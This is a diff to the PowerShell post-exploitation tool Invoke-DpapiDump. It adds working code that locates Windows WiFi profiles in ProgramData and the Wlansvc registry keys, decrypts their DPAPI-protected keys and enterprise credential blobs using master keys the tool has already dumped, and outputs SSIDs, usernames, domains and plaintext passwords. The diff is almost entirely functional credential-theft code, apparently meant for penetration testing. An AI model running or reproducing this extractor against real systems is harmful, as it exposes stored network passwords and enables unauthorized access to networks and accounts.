@@ -6,7 +6,7 @@ Function Invoke-DpapiDump {
     Author: Timothee MENOCHET (@_tmenochet)
 
 .DESCRIPTION
-    Invoke-DpapiDump extracts DPAPI master keys and uses it to decrypt system credentials protected by DPAPI (Windows credentials and vaults).
+    Invoke-DpapiDump extracts DPAPI master keys and uses it to decrypt system credentials protected by DPAPI (Windows credentials, vaults and WiFi credentials).
     The decryption part is adapted from SharpDPAPI by @harmj0y.
 
 .EXAMPLE
@@ -122,6 +122,62 @@ Function Invoke-DpapiDump {
                             $cred = Get-VaultCredential ($vaultData['DecData'])
                             $cred | Add-Member -NotePropertyName 'Data' -NotePropertyValue $vaultData['FriendlyName']
                             $cred | Add-Member -NotePropertyName 'Comment' -NotePropertyValue 'WebCredential'
+                            Write-Output $cred
+                        }
+                    }
+                }
+            }
+        }
+    }
+
+    Write-Verbose "Extracting WiFi credentials..."
+    $regLocations = @(
+        "HKLM:\Software\Microsoft\Wlansvc\UserData\Profiles"
+        "HKLM:\Software\Microsoft\Wlansvc\Profiles"
+    )
+    # Get WiFi profile files
+    Get-ChildItem -Path "$Env:ProgramData\Microsoft\Wlansvc\Profiles\Interfaces" -Recurse -Force | Where-Object {-not $_.PSIsContainer} | ForEach-Object {
+        $profileFile = $_.FullName
+        $profileName = $_.BaseName
+        Write-Verbose "[*] Found WiFi profile file: $profileFile"
+        [xml] $wifiConfig = Get-Content $profileFile
+        $ssid = $wifiConfig.WLANProfile.name
+        if ($keyMaterial = $wifiConfig.WLANProfile.MSM.security.sharedKey.keyMaterial) {
+            # File contains encrypted WiFi key
+            Write-Verbose "[*] Found key material in $profileFile"
+            $keyBytes = [byte[]] ($keyMaterial -replace '^0x' -split '(..)' -ne '' -replace '^', '0x')
+            if ($plaintextBytes = Decrypt-DpapiBlob -BlobBytes $keyBytes -MasterKeys $masterKeys -GuidOffset 24) {
+                $plainKey = [Text.Encoding]::UTF8.GetString($plaintextBytes)
+                $cred = [ordered]@{}
+                $cred['UserName'] = ''
+                $cred['TargetName'] = "Wifi:ssid=$ssid"
+                $cred['Password'] = $plainKey.Trim()
+                $cred['Data'] = ''
+                $cred['Comment'] = 'WifiPSK'
+                Write-Output (New-Object PSObject -Property $cred)
+            }
+        }
+        else {
+            foreach ($location in $regLocations) {
+                if (Test-Path "$location\$profileName") {
+                    Write-Verbose "[*] Found user data in $location\$profileName"
+                    $credentialBytes = (Get-ItemProperty "$location\$profileName" -Name MSMUserData | Select-Object MSMUserData).MSMUserData
+                    if ($plaintextBytes = Decrypt-DpapiBlob -BlobBytes $credentialBytes -MasterKeys $masterKeys -GuidOffset 24) {
+                        $cred = Get-WifiCredentialBlob -DecBlobBytes $plaintextBytes
+                        if ($cred.Data) {
+                            # Data contains encrypted password
+                            if ($passwordBytes = Decrypt-DpapiBlob -BlobBytes $cred.Data -MasterKeys $masterKeys -GuidOffset 24) {
+                                $password = ([Text.Encoding]::UTF8.GetString($passwordBytes)).Trim([char]0)
+                                $cred | Add-Member -NotePropertyName 'Password' -NotePropertyValue $password
+                                $cred.Data = ''
+                            }
+                        }
+                        else {
+                            $cred | Add-Member -NotePropertyName 'Data' -NotePropertyValue ''
+                        }
+                        if ($cred.Password) {
+                            $cred | Add-Member -NotePropertyName 'TargetName' -NotePropertyValue "Wifi:ssid=$ssid"
+                            $cred | Add-Member -NotePropertyName 'Comment' -NotePropertyValue 'WifiCredential'
                             Write-Output $cred
                         }
                     }
@@ -947,6 +1003,133 @@ Function Local:Get-VaultCredential ([byte[]] $DecBytes) {
         }
     }
     return (New-Object PSObject -Property $cred)
+}
+
+Function Local:Get-WifiCredentialBlob {
+    Param (
+        [byte[]]
+        $DecBlobBytes
+    )
+
+    Begin {
+        Function Local:Find-ByteArraySubstring ([byte[]] $hayStack, [byte[]] $needle, [int] $startAt = 0, [bool] $invert = $false) {
+            for ($i = $startAt; $i -lt $hayStack.length; $i++) {
+                [bool] $broken = $false
+                for ($j = 0; $j -lt $needle.length; $j++) {
+                    if ($invert) {
+                        if ($needle[$j] -eq $hayStack[$i + $j]) {
+                            $broken = $true
+                            break
+                        }
+                    } else {
+                        if ($needle[$j] -ne $hayStack[$i + $j]) {
+                            $broken = $true
+                            break
+                        }
+                    }
+                }
+                if (-not $broken) {
+                    return $i
+                }
+            }
+            return -1
+        }
+
+        Function Local:Get-ByteArraySlice ([byte[]] $data, [int] $startIndex = -1, [int] $endIndex = -1) {
+            if ($startIndex -lt 0) {
+                Write-Host "Error: Slice start index cannot be < 0"
+                $startIndex = 0;
+            }
+            if ($endIndex -lt 0 -or $endIndex -gt $data.Count) {
+                Write-Host "Error: Slice end index may not be < 0 or > size"
+                $endIndex = $data.Count;
+            }
+            if ($endIndex -lt $startIndex) {
+                Write-Host "Error: Slice end index may not be < start index"
+                return @()
+            }
+            [int] $sliceSize = $endIndex - $startIndex
+            [byte[]] $slice = @(0x00) * $sliceSize
+            for ($i = 0; $i -lt $sliceSize; $i++) {
+                [int] $currentIndex = $startIndex + $i
+                $slice[$i] = $data[$currentIndex]
+            }
+            return $slice
+        }
+    }
+
+    Process {
+        $cred = [ordered]@{}
+        [byte[]] $nullArray = @(0x00)
+
+        [byte[]] $passwordPattern = @(0x01, 0x00, 0x00, 0x00, 0xD0, 0x8C, 0x9D, 0xDF, 0x01)
+        [int] $passwordFieldStart = Find-ByteArraySubstring -hayStack $DecBlobBytes -needle $passwordPattern
+        if ($passwordFieldStart -ne -1) {
+            [byte[]] $passwordBytes = Get-ByteArraySlice -data $DecBlobBytes -startIndex $passwordFieldStart -endIndex $DecBlobBytes.Length
+            $cred['Data'] = $passwordBytes
+        }
+
+        [byte[]] $usernamePattern = @(0x04, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00)
+        [int] $usernameFieldStart = Find-ByteArraySubstring -hayStack $DecBlobBytes -needle $usernamePattern
+        if ($usernameFieldStart -ne -1) {
+            $usernameFieldStart += $usernamePattern.Length
+            [int] $usernameFieldEnd = Find-ByteArraySubstring -hayStack $DecBlobBytes -needle $nullArray -startAt $usernameFieldStart
+            if ($usernameFieldEnd -ne -1) {
+                [byte[]] $usernameField = Get-ByteArraySlice -data $DecBlobBytes -startIndex $usernameFieldStart -endIndex $usernameFieldEnd
+                $username = ([Text.Encoding]::UTF8.GetString($usernameField)).Trim([char]0)
+                $cred['UserName'] = $username
+
+                [int] $domainFieldStart = Find-ByteArraySubstring -hayStack $DecBlobBytes -needle $nullArray -startAt ($usernameFieldEnd + 1) -invert $true
+                if ($domainFieldStart -ne -1 -and $DecBlobBytes[$domainFieldStart] -ne 0xE6) {
+                    [int] $domainFieldEnd = Find-ByteArraySubstring -hayStack $DecBlobBytes -needle $nullArray -startAt $domainFieldStart
+                    if ($domainFieldEnd -ne -1) {
+                        [byte[]] $possibleDomainField = Get-ByteArraySlice -data $DecBlobBytes -startIndex $domainFieldStart -endIndex $domainFieldEnd
+                        $domain = [Text.Encoding]::UTF8.GetString($possibleDomainField)
+                        $cred['UserName'] = "$domain\$username"
+                    }
+                }
+            }
+        }
+        else {
+            [byte[]] $usernamePattern = @(0x03, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00)
+            [int] $usernameFieldStart = Find-ByteArraySubstring -hayStack $DecBlobBytes -needle $usernamePattern
+            if ($usernameFieldStart -ne -1) {
+                $usernameFieldStart += $usernamePattern.Length;
+                $usernameFieldStart = Find-ByteArraySubstring -hayStack $DecBlobBytes -needle $nullArray -startAt $usernameFieldStart -invert $true
+                [int] $usernameFieldEnd = Find-ByteArraySubstring -hayStack $DecBlobBytes -needle $nullArray -startAt $usernameFieldStart
+                if ($usernameFieldStart -ne -1) {
+                    [int] $usernameFieldEnd = Find-ByteArraySubstring -hayStack $DecBlobBytes -needle $nullArray -startAt ($usernameFieldEnd + 1) -invert $true
+                    [byte[]] $usernameField = Get-ByteArraySlice -data $DecBlobBytes -startIndex $usernameFieldStart -endIndex $usernameFieldEnd
+                    $username = ([Text.Encoding]::UTF8.GetString($usernameField)).Trim([char]0)
+                    $cred['UserName'] = $username
+
+                    [int] $passwordFieldStart = Find-ByteArraySubstring -hayStack $DecBlobBytes -needle $nullArray -startAt ($usernameFieldEnd + 1) -invert $true
+                    if ($passwordFieldStart -ne -1) {
+                        [int] $passwordFieldEnd = Find-ByteArraySubstring -hayStack $DecBlobBytes -needle $nullArray -startAt ($passwordFieldStart + 1)
+                        if ($passwordFieldEnd -ne -1) {
+                            [byte[]] $passwordField = Get-ByteArraySlice -data $DecBlobBytes -startIndex $passwordFieldStart -endIndex $passwordFieldEnd
+                            $password = [Text.Encoding]::UTF8.GetString($passwordField)
+                            $cred['Password'] = $password
+
+                            [int] $domainFieldStart = Find-ByteArraySubstring -hayStack $DecBlobBytes -needle $nullArray -startAt ($passwordFieldEnd + 1) -invert $true
+                            if ($domainFieldStart -ne -1) {
+                                [int] $domainFieldEnd = Find-ByteArraySubstring -hayStack $DecBlobBytes -needle $nullArray -startAt ($domainFieldStart + 1)
+                                if ($domainFieldEnd -ne -1) {
+                                    [byte[]] $domainField = Get-ByteArraySlice -data $DecBlobBytes -startIndex $domainFieldStart -endIndex $domainFieldEnd
+                                    if ($domainField[0] -ne 0x01) {
+                                        $domain = [Text.Encoding]::UTF8.GetString($domainField)
+                                        $cred['UserName'] = "$domain\$username"
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        }
+
+        return (New-Object PSObject -Property $cred)
+    }
 }
 
 Add-Type -TypeDefinition @"
